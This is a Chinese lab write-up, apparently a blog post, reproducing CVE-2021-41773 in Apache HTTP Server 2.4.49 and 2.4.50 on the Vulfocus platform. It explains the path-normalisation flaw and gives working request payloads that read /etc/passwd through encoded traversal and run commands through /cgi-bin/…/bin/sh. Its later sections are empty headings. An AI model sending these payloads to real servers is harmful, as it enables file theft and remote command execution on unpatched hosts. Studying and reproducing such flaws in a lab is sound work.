# 原创
：  【漏洞复现-Apache-目录穿越文件读取-RCE】vulfocus/apache(cve_2021_41773)

# 【漏洞复现-Apache-目录穿越文件读取-RCE】vulfocus/apache(cve_2021_41773)

**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、漏洞版本:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[1.4、条件：](#1.4%E3%80%81%E6%9D%A1%E4%BB%B6%EF%BC%9A)

[1.5、成因：](#1.5%E3%80%81%E6%88%90%E5%9B%A0%EF%BC%9A)

[2.4.49版本](#2.4.49%E7%89%88%E6%9C%AC)

[2.4.50版本](#2.4.50%E7%89%88%E6%9C%AC)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.2、任意文件读取：](#2.2%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%9A)

[2.3、RCE：](#2.3%E3%80%81RCE%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

[2.5、利用工具：](#2.5%E3%80%81%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:43713







 

> 
<h3>1.2、漏洞版本:</h3>
Apache HTTP Server 2.4.49、2.4.50


> 
<h3>1.3、描述：</h3>
版本对路径规范化所做的更改中存在一个路径穿越漏洞，攻击者可利用该漏洞读取到Web目录外的其他文件，如系统配置文件、网站源码等，甚至在特定情况下，攻击者可构造恶意请求执行命令，控制服务器。


> 
<h3>1.4、条件：</h3>
配置目录遍历，开启cgi mode<br/> 版本为2.4.49/2.4.50<br/> 存在cgi-bin和icons文件夹
//CGI-BIN是一种特殊的目录，在进行交互式的WWW访问（如填写在线表格），需要服务器上有相应的程序对访问者输入的信息进行处理，即CGI程序


> 
<h3>1.5、成因：</h3>
<h4>2.4.49版本</h4>
使用的ap_normalize_path函数在对路径参数进行规范化时会先进行url解码，判断是否存在../的路径穿越符
当检测到路径中存在%字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符
如%2e-&gt;.转换完成后，会继续判断是否存在../
如果路径中存在%2e./形式，就会检测到，但是出现.%2e/这种形式时，就不会检测到，原因是在遍历到第一个.字符时，此时检测到后面的两个字符是%2而不是./，就不会把它当作路径穿越符处理，因此可以使用.%2e/或者%2e%2e绕过对路径穿越符的检测
<hr/>
<h4>2.4.50版本</h4>
修复不完整，50版本也存在该漏洞
GET payload:
/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
POST payload:
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

加上需要执行的命令


#### 2.4.50版本

---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
抓包





> 
<h3>2.2、任意文件读取：</h3>
payload
<pre>`GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1`</pre>




> 
<h3>2.3、RCE：</h3>
payload：
<pre><code>POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1




echo Content-Type: text/plain; echo; id;whoami</code></pre>





> 
<h3>2.4、解题：</h3>




> 
<h3>2.5、利用工具：</h3>



